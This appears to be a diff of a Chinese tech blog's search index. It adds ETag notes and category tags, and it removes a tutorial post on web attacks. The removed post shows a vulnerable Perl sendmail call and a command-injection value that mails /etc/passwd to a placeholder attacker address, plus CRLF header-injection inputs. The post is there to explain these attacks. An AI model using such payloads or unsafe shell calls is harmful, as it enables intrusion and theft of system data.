@@ -38,8 +38,14 @@
 <li>Etag/If-None-Match， 值都是由服务器为每一个资源生成的唯一标识串，只要资源有变化就这个值就会改变。服务器根据文件本身算出一个哈希值并通过 ETag字段返回给浏览器，接收到 If-None-Match 字段以后，服务器通过比较两者是否一致来判定文件内容是否被改变。与 Last-Modified 不一样的是，当服务器返回 304 Not Modified 的响应时，由于在服务器上ETag 重新计算过，response header中还会把这个 ETag 返回，即使这个 ETag 跟之前的没有变化。</li>
 </ul>
 <p>HTTP 中并没有指定如何生成 ETag，可以由开发者自行生成，哈希是比较理想的选择。</p>
+<h1 id="ETag的出现，主要是为了解决-Last-Modified-无法解决的一些问题："><a href="#ETag的出现，主要是为了解决-Last-Modified-无法解决的一些问题：" class="headerlink" title="ETag的出现，主要是为了解决 Last-Modified 无法解决的一些问题："></a>ETag的出现，主要是为了解决 Last-Modified 无法解决的一些问题：</h1><ul>
+<li>某些服务器不能精确得到文件的最后修改时间， 这样就无法通过最后修改时间来判断文件是否更新了。</li>
+<li>某些文件的修改非常频繁，在秒以下的时间内进行修改. Last-Modified只能精确到秒。</li>
+<li>一些文件的最后修改时间改变了，但是内容并未改变。 我们不希望客户端认为这个文件修改了</li>
+</ul>
 ]]></content>
       <categories>
+        <category>计算机网络</category>
         <category>HTTP</category>
       </categories>
   </entry>
@@ -1357,7 +1363,8 @@
 <p>注意：<strong>服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制</strong></p>
 ]]></content>
       <categories>
-        <category>JavaScript</category>
+        <category>前端工程化</category>
+        <category>webpack</category>
       </categories>
   </entry>
   <entry>
@@ -2496,94 +2503,6 @@
       </categories>
   </entry>
   <entry>
-    <title>针对Web的攻击技术</title>
-    <url>/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<h1 id="针对Web应用的攻击模式"><a href="#针对Web应用的攻击模式" class="headerlink" title="针对Web应用的攻击模式"></a>针对Web应用的攻击模式</h1><ul>
-<li>主动攻击</li>
-<li>被动攻击</li>
-</ul>
-<h2 id="以服务器为目标的主动攻击"><a href="#以服务器为目标的主动攻击" class="headerlink" title="以服务器为目标的主动攻击"></a>以服务器为目标的主动攻击</h2><p>指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式，由于该模式是直接针对服务器的资源进行攻击的，因此攻击者需要能访问到那些资源，主动攻击模式里具有代表性的攻击时SQL注入攻击和OS命令注入攻击</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj1-16515011876625.png"></p>
-<h2 id="以服务器为目标的被动攻击"><a href="#以服务器为目标的被动攻击" class="headerlink" title="以服务器为目标的被动攻击"></a>以服务器为目标的被动攻击</h2><p>被动攻击利用圈套策略执行攻击代码的攻击模式。攻击者不直接对目标Web应用访问攻击</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj2.png"></p>
-<h2 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h2><p>是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击，动态创建的HTML部分可能隐藏着安全漏洞，就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，就会受到被动攻击</p>
-<h3 id="跨站脚本攻击可能造成的影响"><a href="#跨站脚本攻击可能造成的影响" class="headerlink" title="跨站脚本攻击可能造成的影响"></a>跨站脚本攻击可能造成的影响</h3><ul>
-<li>利用虚假输入的表单骗取用户个人信息</li>
-<li>利用脚本窃取用户的COOkie值，被害者在不知情的情况下帮助攻击者发送请求</li>
-<li>显示伪造的文章或图片</li>
-</ul>
-<p>eg:</p>
-<p>在网站地址朗中URI测查询字段ID即相当于在表单内自动填写字符串的功能，写入：</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj3.png"></p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj4.png"></p>
-<h3 id="对用户Cookie的窃取"><a href="#对用户Cookie的窃取" class="headerlink" title="对用户Cookie的窃取"></a>对用户Cookie的窃取</h3><p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj5.png"></p>
-<h2 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h2><p>会执行非法SQL的SQL注入攻击</p>
-<h3 id="造成影响："><a href="#造成影响：" class="headerlink" title="造成影响："></a>造成影响：</h3><ul>
-<li>非法查看或篡改数据库内的数据</li>
-<li>规避认证</li>
-<li>执行和数据库服务业务关联的程序等</li>
-</ul>
-<p>eg:</p>
-<p>某购物网站可将坐着名字作为搜索关键字查找他的所有著作</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj6.png"></p>
-<p>结果跟flag=1的设定值无关，只取出author=”上野宣”，这样未出版的书籍也一并显示</p>
-<h2 id="OS命令注入攻击"><a href="#OS命令注入攻击" class="headerlink" title="OS命令注入攻击"></a>OS命令注入攻击</h2><p>指通过Web应用，执行非法的操作系统命令达到攻击的目的，只要在能调用Shell函数的地方就有存在被攻击的风险。</p>
-<p>可以从Web应用中通过Shell来调用操作系统命令，倘若调用Shell时存在疏漏，就可以执行非法的OS命令。OS命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。</p>
-<p>eg:</p>
-<p>咨询表单的发送功能，将用户的咨询邮件按已填写对方的邮箱地址发送过去。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my $adr= $q-&gt;param(&#x27;mailaddress&#x27;);</span><br><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail $adr&quot;);</span><br><span class="line">print MAIL &quot;FROM :info@example.com\n&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>程序中的open函数会调用sendmail命令发送邮件，而制定邮件发送地址是$adr，攻击者把下面的值制定为邮件地址</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;cat /etc/passwd |mail hack@example.jp</span><br></pre></td></tr></table></figure>
-
-<p>程序接收到该值后构成以下组合：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail;cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
-
-<p>“;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给<a href="mailto:&#x68;&#97;&#99;&#x6b;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#108;&#101;&#46;&#x6a;&#x70;">&#x68;&#97;&#99;&#x6b;&#x40;&#x65;&#120;&#x61;&#109;&#112;&#108;&#101;&#46;&#x6a;&#x70;</a>。</p>
-<h2 id="HTTP首部注入攻击"><a href="#HTTP首部注入攻击" class="headerlink" title="HTTP首部注入攻击"></a>HTTP首部注入攻击</h2><p>值攻击者通过在响应首部字段内插入换行，添加任意响应首部或主题的一种攻击，属于被动攻击模式。向首部主题内添加内容的攻击称为HTTP响应阶段攻击。</p>
-<p>HTTP首部注入攻击有可能会造成以下影响：</p>
-<ul>
-<li>设置任何Cookie信息</li>
-<li>重定向至任意URL</li>
-<li>显示任意的主体（HTTP响应阶段攻击）</li>
-</ul>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj7.png"></p>
-<p>此刻，Set-Cookie生效，攻击者可指定修改任意Cookie信息，通过和绘画固定攻击组合，攻击者可伪装成用户</p>
-<p>攻击者输入%0D%0A变成换行符，结果插入了新的首部字段。</p>
-<h2 id="HTTP响应截断攻击"><a href="#HTTP响应截断攻击" class="headerlink" title="HTTP响应截断攻击"></a>HTTP响应截断攻击</h2><p>HTTP响应截断攻击是用在HTTP首部注入的一种攻击，攻击顺序相同，但是要将两个%0D%0A%0D%0A并排插入字符串后发送，利用这两个连续的换行可作出HTTP首部和主体分割所需的空行，这样就能显示伪造的主体，达到攻击目的。</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj8.png"></p>
-<p>利这种攻击，已触发陷阱的用户浏览器会显示伪造的WEB页面，再让用户输入自己的个人信息，达到和XSS攻击相同效果</p>
-<h2 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h2><p>攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。<br>邮件地址：<br>%0D%0A 代表一个换行符，可以实现邮件地址的追加</p>
-<p>%0D%0A%0D%0A代表两个连续的换行符，可以篡改邮件文本内容</p>
-<h2 id="目录遍历攻击："><a href="#目录遍历攻击：" class="headerlink" title="目录遍历攻击："></a>目录遍历攻击：</h2><p>对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击<br>用户可使用．…/等相对路径定位到/etc/passed等绝对路径上<br>例：</p>
-<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。<br>例：<img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj9.png"></p>
-<h2 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a>开放重定向</h2><p>是指对指定的任意URL左重定向跳转功能，而与此功能先关联的安全漏洞是指，加入指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导到那个网站，有可能被攻击者选中并作为钓鱼攻击的跳板</p>
-<h2 id="因会话管理疏忽引发漏洞"><a href="#因会话管理疏忽引发漏洞" class="headerlink" title="因会话管理疏忽引发漏洞"></a>因会话管理疏忽引发漏洞</h2><p>会话劫持：攻击者通过某种手段拿到用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击目的。</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj10.png">会话</p>
-<h2 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h2><p>对以窃取目标会话ID为主动攻击手段的会话劫持，会话固定攻击会强制用户使用攻击者指定额会话ID</p>
-<p>例子：</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj11.png"></p>
-<h2 id="跨站点请求伪造（CSRF）"><a href="#跨站点请求伪造（CSRF）" class="headerlink" title="跨站点请求伪造（CSRF）"></a>跨站点请求伪造（CSRF）</h2><p>是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p>
-<h3 id="可能造成的影响："><a href="#可能造成的影响：" class="headerlink" title="可能造成的影响："></a>可能造成的影响：</h3><ul>
-<li>利用已通过认证的用户权限更新设定信息等</li>
-<li>利用已通过认证的用户权限购买商品</li>
-<li>利用已通过认证的用户权限在留言板发表言论</li>
-</ul>
-<p>例子：</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj12.png"></p>
-<h2 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h2><p>是一种让运行中的服务呈停止状态的攻击，有时也叫停止攻击或拒绝服务攻击，DoS攻击的对象不仅限于Web网站，还包括网络设备及服务器。</p>
-<h3 id="主要有两种DOS攻击方式："><a href="#主要有两种DOS攻击方式：" class="headerlink" title="主要有两种DOS攻击方式："></a>主要有两种DOS攻击方式：</h3><ul>
-<li>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈现停止状态。</li>
-<li>通过攻击安全漏洞使服务停止</li>
-</ul>
-<p>集中利用访问请求，就是发送大量的合法请求，服务器很难分辨何为正常请求，何为攻击请求，因此很难防止DOS攻击。</p>
-<p>多台计算机发起的DOS攻击称为DDOS攻击，DDOS攻击通常利用那些感染病毒的极端及作为攻击者的攻击跳板</p>
-]]></content>
-      <categories>
-        <category>HTTP</category>
-      </categories>
-  </entry>
-  <entry>
     <title>WebSocket</title>
     <url>/2022/04/12/WebSocket/</url>
     <content><![CDATA[<p>初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？</p>
@@ -2741,6 +2660,7 @@
 <p>如果代理服务器由于某些原因导致请求转发失败，客户端也就等不到服务器返回的响应。</p>
 ]]></content>
       <categories>
+        <category>计算机网络</category>
         <category>HTTP</category>
       </categories>
   </entry>
@@ -2889,6 +2809,7 @@
 </ul>
 ]]></content>
       <categories>
+        <category>前端工程化</category>
         <category>webpack</category>
       </categories>
   </entry>
@@ -3132,6 +3053,7 @@
 </tbody></table>
 ]]></content>
       <categories>
+        <category>计算机网络</category>
         <category>HTTP</category>
       </categories>
   </entry>
@@ -3485,8 +3407,8 @@
     <title>git遇到的坑</title>
     <url>/2022/03/18/git%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
     <content><![CDATA[<p>解决用git push origin master时出现的问题<br>不知道小伙伴们在使用git push origin master时有没有遇到下面的问题，今天我遇到了，原因一般是相同的，下面详细分析一下</p>
-<p>报错内容：<br>To github.com:<em><strong>/</strong></em><br>! [rejected] master -&gt; master (non-fast-forward)<br>error: failed to push some refs to ‘<a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#111;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#111;&#109;</a>:***/***’<br>hint: Updates were rejected because the tip of your current branch is behind<br>hint: its remote counterpart. Integrate the remote changes (e.g.<br>hint: ‘git pull …’) before pushing again.<br>hint: See the ‘Note about fast-forwards’ in ‘git push –help’ for details.</p>
-<p>大致翻译为：<br>错误：无法将一些引用推送到’<a href="mailto:&#x67;&#x69;&#116;&#x40;&#x67;&#x69;&#116;&#x68;&#117;&#98;&#46;&#x63;&#x6f;&#x6d;">&#x67;&#x69;&#116;&#x40;&#x67;&#x69;&#116;&#x68;&#117;&#98;&#46;&#x63;&#x6f;&#x6d;</a>：****** / Demo.git’<br>提示：由于当前分支的尖端位于其远程对应的后面，因此更新被拒绝。 合并远程更改（例如’git pull’），然后再次推送。 有关详细信息，请参见“ git push –help”中的“关于fast-forwards的注意事项”。</p>
+<p>报错内容：<br>To github.com:<em><strong>/</strong></em><br>! [rejected] master -&gt; master (non-fast-forward)<br>error: failed to push some refs to ‘<a href="mailto:&#103;&#105;&#116;&#64;&#x67;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#111;&#x6d;">&#103;&#105;&#116;&#64;&#x67;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#111;&#x6d;</a>:***/***’<br>hint: Updates were rejected because the tip of your current branch is behind<br>hint: its remote counterpart. Integrate the remote changes (e.g.<br>hint: ‘git pull …’) before pushing again.<br>hint: See the ‘Note about fast-forwards’ in ‘git push –help’ for details.</p>
+<p>大致翻译为：<br>错误：无法将一些引用推送到’<a href="mailto:&#x67;&#105;&#x74;&#64;&#103;&#105;&#x74;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#109;">&#x67;&#105;&#x74;&#64;&#103;&#105;&#x74;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#109;</a>：****** / Demo.git’<br>提示：由于当前分支的尖端位于其远程对应的后面，因此更新被拒绝。 合并远程更改（例如’git pull’），然后再次推送。 有关详细信息，请参见“ git push –help”中的“关于fast-forwards的注意事项”。</p>
 <p>这个报错的原因是因为远程repository和本地的repository有冲突，下面有3种解决办法：</p>
 <p>按上面报错内容中所给的提示先用git pull之后再用git push<br>$ git pull origin master<br>$ git push origin master</p>
 <p>使用强制push的方法，但是这会使远程修改丢失，一般是不可取的，尤其是多人协作开发的时候<br>$ git push origin master -f</p>
